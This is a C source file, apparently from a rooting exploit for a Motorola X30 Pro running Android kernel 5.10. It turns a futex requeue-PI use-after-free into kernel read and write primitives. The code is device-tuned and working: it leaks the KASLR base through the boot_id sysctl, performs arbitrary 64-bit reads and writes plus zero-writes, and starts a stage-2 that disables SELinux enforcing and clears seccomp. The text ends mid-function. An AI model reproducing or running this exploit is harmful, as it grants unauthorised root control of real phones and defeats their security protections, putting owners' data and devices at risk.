/*
 * slide_eqs.c — armed "slide" route for the MOTOROLA X30 PRO (eqs),
 * kernel 5.10.233-android12-9-00062-g49c66df526b8-ab13101360.
 *
 * Ported from the device-proven standalone exploit (eqs_source/src/slide.c +
 * eqs_source/src/pipe.c). The generic core routes are NOT usable on eqs:
 *
 *   - The compact (6.1) / rb_node (6.6) pselect route arms the UAF by running
 *     do_pselect_fake_lock_route() from the waiter thread after the plain
 *     ROUTE_WAIT_SECONDS timeout. On eqs the timeout path takes the clean
 *     dequeue and never leaves the dangling rt_mutex_waiter, so no shift or
 *     overlay can leak or write. Arming needs a SIGALRM delivered to the waiter
 *     ~50 ms after FUTEX_CMP_REQUEUE_PI while it is blocked on the PI mutex; the
 *     handler's setpriority() then reaches rt_mutex_adjust_pi().
 *   - The fake rt_mutex must be a zeroed .bss alias, NOT the reclaimed-skb
 *     payload page: the payload's fake_lock never lands on eqs and the walk then
 *     spins at raw_spin_trylock(&lock->wait_lock) / descends garbage under a raw
 *     spinlock with IRQs off -> black screen, then a delayed watchdog reboot.
 *     Usable zero scratch is the pure linker alignment padding
 *     [init_pg_end, _end) = [0xffffffc00aa85000, 0xffffffc00aa90000): 1280 slots
 *     of 0x20 (sizeof(struct rt_mutex) = 0x20). init_pg_dir is NOT usable (early
 *     page tables are non-zero).
 *   - A walk leaves lock->waiters.rb_leftmost = &waiter->tree_entry, i.e. the
 *     walking child's kernel-stack address, so a slot must NEVER be walked twice
 *     across processes (the next rt_mutex_top_waiter() would dereference a dead
 *     stack and PANIC_ON_OOPS reboots). Slots are handed out from a persistent
 *     per-installation serial in disjoint 64-slot blocks: 20 runs per boot.
 *
 * Stage-2 reuses the exact same armed machinery with an override overlay:
 *   shape 0: word0=A=value, word1=0, word2=L=target
 *            => *(target) = value   plus collateral *(value+8) = target
 * The KASLR leak and the arbitrary read both use the shape-0 trick with
 *   A = q (address to read), L = &random_table[boot_id].data
 * after which reading /proc/sys/kernel/random/boot_id returns 16 bytes at q.
 * The oracle (second 8 bytes == L) also proves uuid[8] != 0, which is what stops
 * proc_do_uuid() from writing fresh random bytes back into table->data.
 */

#include "common.h"
#include <linux/seccomp.h>
#include <linux/prctl.h>
#include <stdarg.h>

/* Raw, stdio-free emit. Once the cred install lands, stdio output from the
 * exploit process can disappear (the pselect children's fd install and the
 * identity change make printf unreliable); the critical result lines are written
 * straight to fd 1 so they survive. */
static void eqs_raw_emit(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n > 0) {
    size_t len = (size_t)n < sizeof(buf) ? (size_t)n : sizeof(buf) - 1;
    ssize_t w = write(STDOUT_FILENO, buf, len);
    (void)w;
  }
}

/* eqs symbol OFFSETS relative to the image base (kallsyms VA - _text).
 * NB the Image VAs are 0xffffffc00a... but the offsets are 0x02a...: the VA
 * base is 0xffffffc008000000, so e.g. 0xffffffc00aa85000 - base == 0x02a85000. */
#define EQS_OFF_PER_CPU_OFFSET 0x0278a558ULL /* __per_cpu_offset[] */
#define EQS_OFF_ENTRY_TASK     0x027562f8ULL /* per-cpu __entry_task */
/* thread_info.flags word of a task (CONFIG_THREAD_INFO_IN_TASK => task+0). */
#define EQS_TASK_THREAD_INFO_FLAGS_OFF 0x0
/* byte0==0 alias used to disable SELinux enforcing (selinux_state+0 is a bool),
 * standalone eqs target.h SLIDE_SELINUX_ZERO_VALUE_IMAGE = ..c00aa85000. */
#define EQS_SELINUX_ZERO_IMAGE_OFF 0x02a85000ULL

/* zero-slot pool: pure .bss/Image alignment padding [init_pg_end, _end).
 * init_pg_end == 0xffffffc00aa85000 -> image-relative offset 0x02a85000. */
#define EQS_SLOT_BASE_IMAGE_OFF 0x02a85000ULL
#define EQS_SLOT_STRIDE 0x20ULL
#define EQS_SLOT_COUNT 1280u
/* disjoint per-run blocks: a slot is walked at most once per boot. */
#define EQS_SLOT_FRESH_STRIDE 64u

#define EQS_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define EQS_WAIT_SECONDS 2
#define EQS_PSELECT_TIMEOUT_SEC 2
#define EQS_CONSUME_DELAY 2000
#define EQS_OP_TIMEOUT_SEC 90
#define EQS_LEAK_ATTEMPTS 3
#define EQS_WRITE_ATTEMPTS 3
#define EQS_RESULT_GUARD 0x5a1de9c0de5a1de9ULL

/* overlay words consumed by prepare_pselect_fdsets()' compact_waiter==2 branch */
int slide_override_active;
uintptr_t slide_override_w0;
uintptr_t slide_override_w1;
uintptr_t slide_override_w2;
uintptr_t slide_override_lock;

/* 5.10 flat waiter->prio used by the overlay (eqs FAKE_WAITER_PRIO == 130). */
uint64_t g_eqs_waiter_prio = 130;

static uint32_t eqs_f_wait;
static uint32_t eqs_f_pi_target;
static uint32_t eqs_f_pi_chain;

static atomic_int eqs_waiter_ready;
static atomic_int eqs_waiter_waiting;
static atomic_int eqs_owner_started;
static atomic_int eqs_route_done;
static atomic_int eqs_waiter_tid;
static atomic_int eqs_consume_go;
static atomic_int eqs_consume_stop;
static atomic_int eqs_consume_calls;
static atomic_int eqs_consume_lost;
static atomic_int eqs_consume_sched_ok;
static atomic_int eqs_sigalrm_count;
static atomic_int eqs_sigalrm_setprio_ret;

static int eqs_dbg_pthread_kill_ret = -1;
static int eqs_dbg_pselect_ret = -1;
static int eqs_dbg_pselect_errno;

static unsigned eqs_slot_rot;
/* Monotonic zero-slot consumer for this process: the leak takes one per attempt
 * and stage-2 continues from wherever it stopped, so a slot that a failed leak
 * attempt already walked is never handed out again (reusing a walked slot across
 * processes dereferences a dead kernel stack -> hard lockup). */
static int eqs_next_slot_idx;
static uint64_t eqs_kaslr_base;
static uint64_t eqs_kaslr_slide;

int slide_eqs_is_active(void) {
  return active_offsets && active_offsets->compact_waiter == 2;
}

/* Direct-map alias of an Image address, using the active target's image base
 * and physical load (KASLR-virtual independent: it only depends on P_text and
 * memstart). Never feed this the Image VA itself: it is unmapped under KASLR. */
static uintptr_t eqs_runtime_alias(uintptr_t image_addr) {
  return (uintptr_t)(P0_PAGE_OFFSET |
                     ((image_addr - active_image_text_base()) +
                      (p0_kernel_phys_load - P0_PHYS_OFFSET)));
}

/* Inverse of eqs_runtime_alias(): the image-relative offset of a data alias. */
static uintptr_t eqs_alias_image_offset(uintptr_t alias) {
  return (uintptr_t)((alias - P0_PAGE_OFFSET) -
                     (p0_kernel_phys_load - P0_PHYS_OFFSET));
}

/* ---- zero-slot rotation ----------------------------------------------------
 * Persistent per-installation run serial (same path as the standalone exploit so
 * the two share a rotation and never hand out the same block).
 * A clock-based rotation was NOT enough: two runs a few seconds apart could land
 * in the same block, which is exactly the hard lockup seen on device (enqueue
 * descending a stale tree under lock->wait_lock with IRQs off). */
static unsigned eqs_run_serial(void) {
  const char *path = "/data/local/tmp/.eqs_slot_serial";
  unsigned v = 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    char b[32];
    ssize_t n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n > 0) {
      b[n] = 0;
      v = (unsigned)strtoul(b, NULL, 10);
    }
  }
  v++;
  fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd >= 0) {
    char b[32];
    int n = snprintf(b, sizeof(b), "%u", v);
    if (n > 0) {
      ssize_t w = write(fd, b, (size_t)n);
      (void)w;
    }
    close(fd);
  }
  return v;
}

static void eqs_init_slot_rotation(void) {
  unsigned serial = eqs_run_serial();
  eqs_slot_rot =
      (unsigned)(((unsigned long long)serial * EQS_SLOT_FRESH_STRIDE) %
                 EQS_SLOT_COUNT);
  pr_success("eqs slide slot rotation serial=%u rot=%u pool=%u stride=%u\n",
             serial, eqs_slot_rot, EQS_SLOT_COUNT,
             (unsigned)EQS_SLOT_FRESH_STRIDE);
}

uintptr_t slide_zero_slot(int idx) {
  unsigned n = (unsigned)(idx + (int)eqs_slot_rot) % EQS_SLOT_COUNT;
  /* eqs_runtime_alias() takes an absolute Image VA (it subtracts the base), so
   * lift the image-relative pool offset onto the active image base. */
  return eqs_runtime_alias(active_image_text_base() + EQS_SLOT_BASE_IMAGE_OFF +
                           (uintptr_t)n * EQS_SLOT_STRIDE);
}

/* ---- armed route threads -------------------------------------------------- */

static void *eqs_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&eqs_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&eqs_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    for (unsigned long spin = 0; spin < EQS_CONSUME_DELAY; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&eqs_consume_go) != seq) {
      atomic_fetch_add(&eqs_consume_lost, 1);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&eqs_waiter_tid);
    /* The overlay is resident on the waiter's kernel stack for the whole
     * pselect syscall, but rt_mutex_adjust_pi() only consumes it while
     * task->pi_blocked_on still points at the freed waiter. Fire several
     * sched_setattr attempts spread across the window.
     * nice=10 -> T->prio == waiter->prio -> rt_mutex_adjust_pi()'s
     * rt_mutex_waiter_equal() guard returns TRUE and the chain walk returns
     * before rt_mutex_dequeue (control). nice=1 -> guard FALSE -> the walk
     * runs and reaches rt_mutex_dequeue/erase. */
    for (int attempt = 0; attempt < 6; attempt++) {
      if (!atomic_load(&eqs_consume_go)) {
        break;
      }
      if (attempt != 0) {
        usleep(40000);
      }
      atomic_fetch_add(&eqs_consume_calls, 1);
      int nice_val = (attempt == 0) ? 10 : 1;
      errno = 0;
      long ret = sched_setattr_tid(tid, nice_val);
      if (ret == 0) {
        atomic_fetch_add(&eqs_consume_sched_ok, 1);
      }
    }

    atomic_store(&eqs_consume_stop, 1);
    while (atomic_load(&eqs_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* Arming trigger: an async signal during the requeue-PI wait. The handler's
 * setpriority() forces the priority re-adjust from the handler while the waiter
 * is still blocked on the PI mutex. Without it FUTEX_WAIT_REQUEUE_PI ends by
 * plain timeout (ETIMEDOUT) and takes the clean dequeue -> no dangling waiter. */
static void eqs_alarm_handler(int sig __attribute__((unused))) {
  long r = syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
  atomic_store(&eqs_sigalrm_setprio_ret, (int)r);
  atomic_fetch_add(&eqs_sigalrm_count, 1);
}

static void eqs_pselect_stack_copy(void) {
  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("eqs slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, EQS_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("eqs slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  pr_info("eqs slide pselect setup lock=%016llx override=%d page=%016zx\n",
          (unsigned long long)(slide_override_active ? slide_override_lock
                                                     : fake_lock),
          slide_override_active, page_base);
  log_sync();
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

  atomic_store(&eqs_consume_stop, 0);
  atomic_store(&eqs_consume_go, 0);
  atomic_store(&eqs_consume_sched_ok, 0);
  atomic_store(&eqs_consume_lost, 0);
  atomic_store(&eqs_consume_calls, 0);

  struct timespec timeout = {
    .tv_sec = EQS_PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };

  atomic_store(&eqs_consume_go, 1);
  errno = 0;
  int ret = pselect(EQS_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  eqs_dbg_pselect_ret = ret;
  eqs_dbg_pselect_errno = saved_errno;
  atomic_store(&eqs_consume_go, 0);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static void *eqs_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&eqs_waiter_tid, tid);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = eqs_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);

  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  if (futex_op(&eqs_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("eqs slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&eqs_waiter_ready, 1);
  while (!atomic_load(&eqs_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += EQS_WAIT_SECONDS;

  atomic_store(&eqs_waiter_waiting, 1);
  futex_op(&eqs_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &eqs_f_pi_target,
           0);
  futex_op(&eqs_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  signal(SIGALRM, SIG_DFL);

  eqs_pselect_stack_copy();
  atomic_store(&eqs_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

static void *eqs_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&eqs_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("eqs slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&eqs_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&eqs_owner_started, 1);
  futex_op(&eqs_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

/* Runs the armed route in the calling process and returns nonzero iff the
 * pselect overlay survived long enough for the consumer to trigger at least one
 * real (nice=1) priority adjustment. Shared by the KASLR leak and stage-2. */
int slide_child_arm_and_run(void) {
  /* Block SIGALRM here so owner/consumer inherit the block; only the waiter
   * unblocks it, so pthread_kill(waiter, SIGALRM) targets the waiter thread. */
  sigset_t block;
  sigemptyset(&block);
  sigaddset(&block, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &block, NULL);

  eqs_f_wait = 0;
  eqs_f_pi_target = 0;
  eqs_f_pi_chain = 0;
  atomic_store(&eqs_waiter_ready, 0);
  atomic_store(&eqs_waiter_waiting, 0);
  atomic_store(&eqs_owner_started, 0);
  atomic_store(&eqs_route_done, 0);
  atomic_store(&eqs_waiter_tid, 0);
  atomic_store(&eqs_consume_go, 0);
  atomic_store(&eqs_consume_stop, 0);
  atomic_store(&eqs_sigalrm_count, 0);
  atomic_store(&eqs_sigalrm_setprio_ret, -1);
  eqs_dbg_pthread_kill_ret = -1;
  eqs_dbg_pselect_ret = -1;
  eqs_dbg_pselect_errno = 0;

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, eqs_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, eqs_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, eqs_consumer_thread, NULL));

  while (!atomic_load(&eqs_waiter_waiting) ||
         !atomic_load(&eqs_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  long rq = futex_op(&eqs_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &eqs_f_pi_target, 0);
  pr_info("eqs slide CMP_REQUEUE_PI ret=%ld errno=%d waiter_tid=%d\n", rq, errno,
          atomic_load(&eqs_waiter_tid));

  /* Arm the bug ~50 ms in, while the waiter is still blocked on the PI mutex. */
  usleep(50000);
  eqs_dbg_pthread_kill_ret = pthread_kill(waiter, SIGALRM);

  while (!atomic_load(&eqs_route_done)) {
    sleep(1);
  }

  return atomic_load(&eqs_consume_sched_ok) > 0 &&
         atomic_load(&eqs_route_done);
}

/* ---- per-operation fork driver -------------------------------------------- */

struct eqs_op_result {
  uint64_t guard;
  int armed;
  int sched_ok;
  int pselect_ret;
  int pselect_errno;
  int sigalrm;
  int setprio_ret;
  int pthread_kill_ret;
};

/* Every walk consumes a fresh zero slot and a fresh child kernel stack, so the
 * operation runs in a forked child whose stdout may be clobbered by the pselect
 * fd install; diagnostics travel back over a raised pipe. */
static int eqs_fork_op(int override, int shape, uintptr_t target,
                       uintptr_t value, int slot_idx,
                       struct eqs_op_result *out) {
  int raw[2];
  if (pipe(raw) != 0) {
    pr_warning("eqs op pipe failed errno=%d\n", errno);
    return 0;
  }
  int fds[2];
  fds[0] = fcntl(raw[0], F_DUPFD, EQS_PSELECT_NFDS + 128);
  fds[1] = fcntl(raw[1], F_DUPFD, EQS_PSELECT_NFDS + 129);
  close(raw[0]);
  close(raw[1]);
  if (fds[0] < 0 || fds[1] < 0) {
    pr_warning("eqs op F_DUPFD failed errno=%d\n", errno);
    if (fds[0] >= 0) close(fds[0]);
    if (fds[1] >= 0) close(fds[1]);
    return 0;
  }

  pid_t expected_parent = getpid();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("eqs op fork failed errno=%d\n", errno);
    close(fds[0]);
    close(fds[1]);
    return 0;
  }

  if (child == 0) {
    close(fds[0]);
    setpgid(0, 0);
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 ||
        getppid() != expected_parent) {
      _exit(11);
    }
    disable_rseq_for_thread();

    slide_override_active = override;
    if (override) {
      if (shape == 0) {
        /* rb_left = target, rb_right = 0: *(target) = value */
        slide_override_w0 = value;
        slide_override_w1 = 0;
        slide_override_w2 = target;
      } else if (shape == 2) {
        /* ZERO WRITE (see slide_eqs_zero_write): rb_left = rb_right = 0 takes
         * __rb_erase_augmented()'s no-child path with pc = target-8 (8-aligned,
         * so rb_is_black(pc) == 0 => rebalance == NULL, no color fixup).
         * __rb_change_child() reads parent->rb_left == *(target+8) and, since
         * that is never &waiter->tree_entry, stores parent->rb_right = NULL at
         * parent+8 == target. One store, no A+8 dereference. */
        slide_override_w0 = target - 8;
        slide_override_w1 = 0;
        slide_override_w2 = 0;
      } else {
        /* rb_left = 0, rb_right = value */
        slide_override_w0 = target - 8;
        slide_override_w1 = value;
        slide_override_w2 = 0;
      }
      slide_override_lock = slide_zero_slot(slot_idx);
    } else {
      slide_override_w0 = 0;
      slide_override_w1 = 0;
      slide_override_w2 = 0;
      slide_override_lock = 0;
      fake_lock = slide_zero_slot(slot_idx);
    }

    struct eqs_op_result r;
    memset(&r, 0, sizeof(r));
    r.guard = EQS_RESULT_GUARD;
    r.armed = slide_child_arm_and_run();
    r.sched_ok = atomic_load(&eqs_consume_sched_ok);
    r.pselect_ret = eqs_dbg_pselect_ret;
    r.pselect_errno = eqs_dbg_pselect_errno;
    r.sigalrm = atomic_load(&eqs_sigalrm_count);
    r.setprio_ret = atomic_load(&eqs_sigalrm_setprio_ret);
    r.pthread_kill_ret = eqs_dbg_pthread_kill_ret;
    ssize_t w = write(fds[1], &r, sizeof(r));
    (void)w;
    close(fds[1]);
    _exit(r.armed ? 0 : 16);
  }

  close(fds[1]);

  /* Reap the child first (with a timeout) so a stuck armed run cannot block the
   * parent forever on the pipe read; the result struct is already buffered. */
  struct timespec t_start;
  clock_gettime(CLOCK_MONOTONIC, &t_start);
  int status = 0;
  int reaped = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, WNOHANG);
    if (got == child) {
      reaped = 1;
      break;
    }
    if (got < 0 && errno != EINTR) {
      break;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec - t_start.tv_sec >= EQS_OP_TIMEOUT_SEC) {
      pr_warning("eqs op timeout child=%d slot=%d\n", child, slot_idx);
      kill(-child, SIGKILL);
      kill(child, SIGKILL);
      waitpid(child, NULL, 0);
      close(fds[0]);
      return 0;
    }
    usleep(5000);
  }

  struct eqs_op_result r;
  memset(&r, 0, sizeof(r));
  ssize_t n = read(fds[0], &r, sizeof(r));
  close(fds[0]);

  int ok = reaped && n == (ssize_t)sizeof(r) && r.guard == EQS_RESULT_GUARD &&
           WIFEXITED(status) && WEXITSTATUS(status) == 0 && r.armed;
  if (out) {
    *out = r;
  }
  return ok;
}

/* ---- KASLR leak and arbitrary read ---------------------------------------- */

static int eqs_hex_value(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

static int eqs_read_boot_id_raw(unsigned char raw[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("eqs boot_id open failed errno=%d\n", errno);
    return 0;
  }
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("eqs boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = eqs_hex_value(text[i]);
    if (v < 0) {
      continue;
    }
    if (high < 0) {
      high = v;
      continue;
    }
    raw[out++] = (unsigned char)((high << 4) | v);
    high = -1;
  }
  if (out != 16) {
    pr_warning("eqs boot_id short parse bytes=%d\n", out);
    return 0;
  }
  return 1;
}

/* Reads 8 bytes at q using the boot_id redirect oracle. q+8 is clobbered by the
 * shape-0 collateral, exactly like the standalone exploit. */
static int eqs_read64(uintptr_t q, uint64_t *out, const char *name, int *idx) {
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
  if (!out || !idx || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("eqs-read precheck name=%s q=%016zx\n", name, q);
    return 0;
  }
  for (int attempt = 1; attempt <= EQS_WRITE_ATTEMPTS; attempt++) {
    int slot = (*idx)++;
    struct eqs_op_result r;
    if (!eqs_fork_op(1, 0, b, q, slot, &r)) {
      pr_warning("eqs-read retry name=%s attempt=%d slot=%d reason=primitive\n",
                 name, attempt, slot);
      continue;
    }
    unsigned char raw[16] = {0};
    if (!eqs_read_boot_id_raw(raw)) {
      return 0;
    }
    uint64_t got = 0;
    uint64_t sidecar = 0;
    memcpy(&got, raw, sizeof(got));
    memcpy(&sidecar, raw + 8, sizeof(sidecar));
    int oracle_ok = sidecar == (uint64_t)b && raw[8] == (unsigned char)(b & 0xff);
    pr_success("eqs-read name=%s attempt=%d slot=%d q=%016zx value=%016llx "
               "sidecar=%016llx ok=%d\n",
               name, attempt, slot, q, (unsigned long long)got,
               (unsigned long long)sidecar, oracle_ok);
    if (!oracle_ok) {
      continue;
    }
    *out = got;
    return 1;
  }
  return 0;
}

/* Shape-0 write: *(target) = value (plus collateral *(value+8) = target). */
static int eqs_write64(uintptr_t target, uintptr_t value, const char *name,
                       int *idx) {
  for (int attempt = 1; attempt <= EQS_WRITE_ATTEMPTS; attempt++) {
    int slot = (*idx)++;
    struct eqs_op_result r;
    int ok = eqs_fork_op(1, 0, target, value, slot, &r);
    pr_success("eqs-write name=%s attempt=%d slot=%d target=%016zx "
               "value=%016zx ok=%d armed=%d sched_ok=%d pselect=%d/%d "
               "sigalrm=%d setprio=%d pkill=%d\n",
               name, attempt, slot, target, value, ok, r.armed, r.sched_ok,
               r.pselect_ret, r.pselect_errno, r.sigalrm, r.setprio_ret,
               r.pthread_kill_ret);
    if (ok) {
      return 1;
    }
  }
  return 0;
}

/* Shape-2 ZERO write: *(target) = 0 with a single kernel store and no
 * collateral (see the shape==2 overlay comment in eqs_fork_op). Required for
 * seccomp clearing, where the value must be 0 and shape 0 cannot express it
 * (its collateral would dereference A+8 == 8). target must be 8-byte aligned
 * and writable, and target+8 readable. */
int slide_eqs_zero_write(uintptr_t target, const char *name, int *idx) {
  if ((target & 7) != 0) {
    pr_error("eqs-zero precheck name=%s target=%016zx not 8-aligned\n", name,
             target);
    return 0;
  }
  for (int attempt = 1; attempt <= EQS_WRITE_ATTEMPTS; attempt++) {
    int slot = (*idx)++;
    struct eqs_op_result r;
    int ok = eqs_fork_op(1, 2, target, 0, slot, &r);
    pr_success("eqs-zerowrite name=%s attempt=%d slot=%d target=%016zx ok=%d "
               "armed=%d sched_ok=%d pselect=%d/%d sigalrm=%d setprio=%d "
               "pkill=%d\n",
               name, attempt, slot, target, ok, r.armed, r.sched_ok,
               r.pselect_ret, r.pselect_errno, r.sigalrm, r.setprio_ret,
               r.pthread_kill_ret);
    if (ok) {
      return 1;
    }
  }
  return 0;
}

/* Self-contained, non-vacuous proof of shape 2:
 *   1. shape 0 puts a known NON-ZERO value (the address of a second scratch
 *      slot) at `scratch`;
 *   2. the read primitive reads it back (must equal the seed);
 *   3. shape 2 zero-writes `scratch`;
 *   4. the read primitive reads it back again (must be 0).
 * Both scratch slots are ordinary fresh slots from the zero pool, so this needs
 * no KASLR base and no root. GHOSTLOCK_ZERO_TEST=1 runs only this. */
int slide_eqs_zero_selftest(void) {
  eqs_init_slot_rotation();
  int idx = eqs_next_slot_idx;
  uintptr_t scratch = slide_zero_slot(idx++);
  uintptr_t seed = slide_zero_slot(idx++);
  eqs_next_slot_idx = idx;
  pr_info("eqs-zero-selftest scratch=%016zx seed=%016zx\n", scratch, seed);

  uint64_t pre = 0;
  uint64_t post = 0xdeadbeefdeadbeefULL;
  int ok = 0;
  do {
    if (!eqs_write64(scratch, seed, "zerotest_seed", &idx)) {
      break;
    }
    if (!eqs_read64(scratch, &pre, "zerotest_pre", &idx)) {
      break;
    }
    if (!slide_eqs_zero_write(scratch, "zerotest_zero", &idx)) {
      break;
    }
    if (!eqs_read64(scratch, &post, "zerotest_post", &idx)) {
      break;
    }
    ok = (pre == (uint64_t)seed) && (post == 0);
  } while (0);

  eqs_raw_emit("[+] eqs-zero-selftest ok=%d pre=%016llx expected_seed=%016llx "
               "post=%016llx\n",
               ok, (unsigned long long)pre, (unsigned long long)seed,
               (unsigned long long)post);
  return ok;
}

uint64_t slide_read_stext(void) {
  int slot = eqs_next_slot_idx++;
  if (!eqs_fork_op(1, 0, SLIDE_RANDOM_BOOT_ID_DATA, SLIDE_LOGGERS_0_1, slot,
                   NULL)) {
    pr_warning("eqs leak primitive did not trigger\n");
    return 0;
  }

  unsigned char raw[16] = {0};
  if (!eqs_read_boot_id_raw(raw)) {
    return 0;
  }
  uint64_t leaked = 0;
  memcpy(&leaked, raw, 8);
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
  int oracle_ok = (memcmp(raw + 8, &b, 8) == 0) &&
                  raw[8] == (unsigned char)(b & 0xff);
  pr_info("eqs leaked nfulnl_logger=%016llx sidecar_ok=%d\n",
          (unsigned long long)leaked, oracle_ok);
  if (!oracle_ok || (leaked >> 48) != 0xffff) {
    pr_warning("eqs leak bad pointer=%016llx oracle=%d\n",
               (unsigned long long)leaked, oracle_ok);
    return 0;
  }

  uintptr_t off = eqs_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - (uint64_t)off;
  pr_success("eqs-slide-kaslr-ok base=%016llx slide=%016llx nfulnl_off=%016zx\n",
             (unsigned long long)stext,
             (unsigned long long)(stext - active_image_text_base()),
             (size_t)off);
  return stext;
}

int slide_leak_kernel_base(void) {
  eqs_init_slot_rotation();
  for (int attempt = 1; attempt <= EQS_LEAK_ATTEMPTS; attempt++) {
    pr_info("eqs slide leak attempt %d/%d\n", attempt, EQS_LEAK_ATTEMPTS);
    uint64_t stext = slide_read_stext();
    if (!stext) {
      continue;
    }
    eqs_kaslr_base = stext;
    eqs_kaslr_slide = stext - active_image_text_base();
    return 1;
  }
  return 0;
}

/* ---- stage-2 (cred + SELinux) --------------------------------------------- */

static int eqs_read_enforcing(void) {
  char value[16];
  read_first_line("/sys/fs/selinux/enforce", value, sizeof(value));
  if (value[0] == '0' && value[1] == 0) {
    return 0;
  }
  if (value[0] == '1' && value[1] == 0) {
    return 1;
  }
  return -1;
}

/* Seccomp filter present in this process? (zygote/app flow: yes; adb/shell: no).
 * Only then is it worth zeroing thread_info.flags/seccomp.mode. */
static int eqs_process_has_seccomp(void) {
  FILE *f = fopen("/proc/self/status", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(f);
  return seccomp != 0;
}

/* Clear this task's seccomp filter so forked workers (the root script / ksud
 * chain) run filter-free. Order matters:
 *   1. thread_info.flags (task+0): clearing TIF_SECCOMP makes secure_computing()
 *      short-circuit, so __secure_computing() is never entered while mode is
 *      still stale.
 *   2. seccomp.mode (task+TASK_SECCOMP_OFF = 0x848): mode 0 makes copy_process()
 *      stop re-arming TIF_SECCOMP for children.
 * Clearing mode first (or alone) would send the next syscall into
 * __secure_computing()'s default case, which is BUG()/WARN_ON(1) -> panic on
 * this device. Both stores are shape-2 zero writes. */
static int eqs_clear_seccomp(uintptr_t task, int *idx) {
  if (!eqs_process_has_seccomp()) {
    pr_success("eqs stage-2 no seccomp filter; skipping the W3 clear\n");
    return 1;
  }
  pr_success("eqs stage-2 clearing seccomp flags=%016zx mode=%016zx\n",
             task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
             task + TASK_SECCOMP_OFF);
